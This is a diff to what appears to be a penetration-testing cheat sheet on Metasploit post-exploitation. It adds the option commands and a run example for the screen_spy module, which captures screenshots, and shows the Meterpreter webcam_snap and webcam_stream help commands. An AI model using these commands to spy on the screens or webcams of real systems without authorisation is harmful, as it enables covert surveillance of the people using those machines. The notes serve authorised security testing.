@@ -8,7 +8,9 @@ Search Tag: #metasploit-framework #command-and-control
 
 ```
 meterpreter > webcam_snap -h
+```
 
+```
 meterpreter > webcam_stream -h
 ```
 
@@ -81,6 +83,24 @@ Module options (post/windows/gather/screen_spy):
    SESSION                            yes       The session to run this module on
    VIEW_SCREENSHOTS  false            no        View screenshots automatically
 
+msf post(windows/gather/screen_spy) > set count <int>
+
+msf post(windows/gather/screen_spy) > set delay <seconds>
+
+msf post(windows/gather/screen_spy) > set record true
+
+msf post(windows/gather/screen_spy) > set view_screenshots <false | true>
+
+msf post(windows/gather/screen_spy) > set pid [pid]
+
+msf post(windows/gather/screen_spy) > set session <session_id>
+
+msf post(windows/gather/screen_spy) > run
+```
+
+Check the screenshots stored in the loot.
+
+```
 meterpreter > run post/windows/gather/screen_spy
 
 [*] Capturing 6 screenshots with a delay of 5 seconds
